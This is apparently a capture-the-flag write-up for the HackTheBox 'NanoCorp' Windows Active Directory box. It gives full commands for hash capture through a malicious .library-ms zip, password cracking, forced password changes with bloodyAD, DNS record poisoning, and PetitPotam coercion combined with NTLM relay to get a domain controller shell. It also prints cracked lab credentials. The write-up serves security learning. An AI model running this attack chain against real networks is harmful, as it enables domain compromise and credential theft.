---
title: "NanoCorp HackTheBox" 
date: 2025-11-13 06:00:00 0000+
tags: [WriteUp, NanoCorp, HTB, NTLM Relay, dnstool, winrms relay, .library-ms, zip exploitation, phishing, Unintended, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Nanocorp_HTB/preview_nanocorp.png
---
# NanoCorp HTB Writeup

Nanocorp is an hard rated windows box on hackthebox which focuses on Active directory, Initial foothold is gain by exploiting a malicious zip file to the server which on opening gives us a NetNTLMv2 response for the user, upon cracking it we get the domain credentials. Then after 2-3 hops are exploited to reach the monitoring-svc user in an Active Directory Environment. Then we observe that the user we own can edit the DNS records, thus by doing so we perform an NTLM relay attack by abusing winrms to get a privileged shell on the DC$ as DC$ to claim the root.txt

![image.png](/assets/images/Nanocorp_HTB/image.png)

## Initial Enumeration

We start off with the rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.129.243.199
```

![image.png](/assets/images/Nanocorp_HTB/image%201.png)

![image.png](/assets/images/Nanocorp_HTB/image%202.png)

We see that this is an active directory box with ports DNS, SMB, LDAP being open,ssl ports of WINRM, LDAP are open too.

Also the domain name and the domain controller’s name is revealed to us to so we add them both to our /etc/hosts file.

There is also port 6556 which is running check_mk ext. for nagios 2.1.0p10. I don't know what that is, we will come here later.

### Web Enumeration

Since the port 80 is open on the box lets enumerate the website on http://nanocorp.htb/ 

![image.png](/assets/images/Nanocorp_HTB/image%203.png)

Looking at the **AboutUs** block we see a new subdomain.

![Screenshot_20251113_231841.png](/assets/images/Nanocorp_HTB/Screenshot_20251113_231841.png)

Adding **hire.nanocorp.htb** to our /etc/hosts file.

Now I tried doing some directory busting on the domain.

```bash
gobuster dir -u http://hire.nanocorp.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 100 -x php,html,txt -b 403,404
```

![image.png](/assets/images/Nanocorp_HTB/image%204.png)

Nothing special here.

## Exploitation

### Zip File Upload (.library-ms Phishing Attack)

Visiting http://hire.nanocorp.htb/

![image.png](/assets/images/Nanocorp_HTB/image%205.png)

We have this page to upload zip files to apply for the jobs in nanocorp.

When I saw the upload of .zip files, I instantly knew that this is exploitable using the **CVE-2025-24054.**

In which we create a malicious .library-ms file and zip it. Upon uploading the Phishing attack works to give the NETNTLMV2 hash of the domain user.

POC Used: [https://github.com/Marcejr117/CVE-2025-24071_PoC](https://github.com/Marcejr117/CVE-2025-24071_PoC)

Lets create a malicious zip file.

![Screenshot_20251113_235626.png](/assets/images/Nanocorp_HTB/Screenshot_20251113_235626.png)

Filling the formalities and uploading it.

![Screenshot_20251113_235719.png](/assets/images/Nanocorp_HTB/Screenshot_20251113_235719.png)

![image.png](/assets/images/Nanocorp_HTB/image%206.png)

Ran [Responder.py](http://Responder.py) to catch if the NetNTLMv2 Hash if any user opened it.

```bash
responder -I tun0
```

![Screenshot_20251113_235821.png](/assets/images/Nanocorp_HTB/Screenshot_20251113_235821.png)

And we have a hash.

### Hash Cracking

Lets crack this hash for user web_svc using hashcat.

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Nanocorp_HTB/image%207.png)

Hashcat was successful in cracking the hash.

Saved the credentials for the user web_svc in creds.txt file.

### SMB Enumeration

Lets validate the credentials for web_svc.

```bash
nxc smb nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#'
```

![image.png](/assets/images/Nanocorp_HTB/image%208.png)

We have authentication, lets now check for the shares.

```bash
nxc smb nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --shares
```

![image.png](/assets/images/Nanocorp_HTB/image%209.png)

No special shares found !

### Bloodhound

Lets gather some bloodhound data to analyze and find possible movements on the domain.

```bash
rusthound --domain nanocorp.htb -i 10.129.243.199 -u web_svc -p 'dksehdgh712!@#' -z
```

![Screenshot_20251114_001905.png](/assets/images/Nanocorp_HTB/Screenshot_20251114_001905.png)

Analysing this in bloodhound.

Marking **WEB_SVC** as owned !

![image.png](/assets/images/Nanocorp_HTB/image%2010.png)

### Web_svc → IT Support

We have privileges to add ourself to the **IT Support** Group.

Using BloodyAD to add ourselves to IT SUPPORT group.

```bash
bloodyAD -d nanocorp.htb -i 10.129.243.199 -u 'web_svc' -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' 'WEB_SVC'
```

![image.png](/assets/images/Nanocorp_HTB/image%2011.png)

Marking IT_SUPPORT as owned !

### IT Support → Monitoring_svc

We can now force change the password for monitoring_svc account.

```bash
bloodyAD -d nanocorp.htb -i 10.129.243.199 -u 'web_svc' -p 'dksehdgh712!@#' set password 'MONITORING_SVC' 'aashwin10!'
```

![image.png](/assets/images/Nanocorp_HTB/image%2012.png)

Marking Monitoring_svc user as owned in bloodhound.

### Shell as Monitoring_svc

Upon changing the password of the user **monitoring_svc,** when we tried authenticating as him we failed due to this.

```bash
nxc smb nanocorp.htb -u MONITORING_SVC -p 'aashwin10!'
```

![image.png](/assets/images/Nanocorp_HTB/image%2013.png)

Cause this account is part of **Protected Users.**

But we can always use Kerberos Authentication for these type of cases in which the user is in protected users group.

NOTE: I changed the password form **aashwin10!** to **somepass10!.**

So lets get a TGT for the monitoring_svc user.

```bash
getTGT.py nanocorp.htb/monitoring_svc:'somepass10!'
```

Exported this to KRB5CCNAME, our linux env variable for kerberos operations.

Now we will use [winRMExec.py](http://winRMExec.py) to login and get a shell on the box.

However this shell is not interactive we need to get a reverse shell from this shell.

```bash
python3 /opt/winrmexec/evil_winrmexec.py -k -ssl -port 5986 nanocorp.htb/'monitoring_svc':'somepass10!'@dc01.nanocorp.htb

```

![image.png](/assets/images/Nanocorp_HTB/image%2014.png)

This gives us a shell on our netcat listener and we can claim our user.txt flag.

![image.png](/assets/images/Nanocorp_HTB/image%2015.png)

## Privilege Escalation

### Unintended Way (NTLM Reflection)

Added the vulnerable DNS record using DNSTOOL.PY

```bash
python3 /opt/krbrelayx/dnstool.py -u 'nanocorp.htb\web_svc' -p 'dksehdgh712!@#' -d 10.10.14.44 -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -dns-ip 10.10.11.93 10.10.11.93 --allow-multiple
```

Started the relaying server using the ntlmrelayx.py

```bash
ntlmrelayx.py -smb2support -t winrms://10.10.11.93 -i
```

Then used the coerce_plus module of NXC to coerce the DC into connecting back to us.

```bash
nxc smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#' -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

![image.png](/assets/images/Nanocorp_HTB/image%2016.png)

We get a hit back on our ntlmrelayx server

![image.png](/assets/images/Nanocorp_HTB/image%2017.png)

And now we can interact with it using netcat.

```bash
nc 127.0.0.1 11000
```

![image.png](/assets/images/Nanocorp_HTB/image%2018.png)

Rooted!

![image.png](/assets/images/Nanocorp_HTB/image%2019.png)
